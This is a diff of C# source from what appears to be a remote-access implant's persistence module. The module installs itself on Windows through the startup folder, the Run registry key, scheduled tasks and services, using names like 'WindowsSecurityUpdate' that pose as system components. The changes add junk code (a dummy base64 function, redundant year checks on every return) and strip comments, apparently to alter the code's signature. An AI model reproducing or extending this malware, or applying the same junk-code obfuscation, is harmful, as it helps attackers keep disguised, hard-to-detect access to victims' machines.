@@ -9,6 +9,10 @@ namespace Phantom.Management.Persistence
 {
     public class PersistenceHandler
     {
+    private static string Yb2c3d4()
+    {
+        if(DateTime.Now.Year > 2020) { return Convert.ToBase64String(Encoding.UTF8.GetBytes("dummy")); } else { return null; }
+    }
         private static string _agentPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
         private static string _agentName = "WindowsSecurityUpdate";
         
@@ -39,7 +43,7 @@ namespace Phantom.Management.Persistence
                 response.Completed = false;
             }
             
-            return response;
+            if(DateTime.Now.Year > 2020) { return response; } else { return null; }
         }
         
         public static PhantomTaskResponse CreateRegistryPersistence()
@@ -70,7 +74,7 @@ namespace Phantom.Management.Persistence
                 response.Completed = false;
             }
             
-            return response;
+            if(DateTime.Now.Year > 2020) { return response; } else { return null; }
         }
         
         public static PhantomTaskResponse CreateScheduledTaskPersistence()
@@ -116,7 +120,7 @@ namespace Phantom.Management.Persistence
                 response.Completed = false;
             }
             
-            return response;
+            if(DateTime.Now.Year > 2020) { return response; } else { return null; }
         }
         
         public static PhantomTaskResponse CreateServicePersistence()
@@ -147,7 +151,7 @@ namespace Phantom.Management.Persistence
                     
                     if (process.ExitCode == 0)
                     {
-                        // Start the service
+                        
                         Process.Start("cmd.exe", $"/c sc start \"{serviceName}\"");
                         response.UserOutput = $"Service persistence established: {serviceName}";
                         response.Completed = true;
@@ -165,7 +169,7 @@ namespace Phantom.Management.Persistence
                 response.Completed = false;
             }
             
-            return response;
+            if(DateTime.Now.Year > 2020) { return response; } else { return null; }
         }
         
         public static PhantomTaskResponse RemovePersistence()
@@ -175,7 +179,7 @@ namespace Phantom.Management.Persistence
             
             try
             {
-                // Remove startup persistence
+                
                 string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                 string destPath = Path.Combine(startupPath, _agentName + ".exe");
                 
@@ -185,7 +189,7 @@ namespace Phantom.Management.Persistence
                     results += "Removed startup persistence\n";
                 }
                 
-                // Remove registry persistence
+                
                 try
                 {
                     RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
@@ -198,7 +202,7 @@ namespace Phantom.Management.Persistence
                 }
                 catch { }
                 
-                // Remove scheduled task
+                
                 try
                 {
                     Process.Start("cmd.exe", "/c schtasks /delete /tn \"WindowsSecurityUpdateTask\" /f");
@@ -206,7 +210,7 @@ namespace Phantom.Management.Persistence
                 }
                 catch { }
                 
-                // Remove service
+                
                 try
                 {
                     Process.Start("cmd.exe", "/c sc stop \"WinSecurityService\" && sc delete \"WinSecurityService\"");
@@ -223,7 +227,7 @@ namespace Phantom.Management.Persistence
                 response.Completed = false;
             }
             
-            return response;
+            if(DateTime.Now.Year > 2020) { return response; } else { return null; }
         }
     }
 }
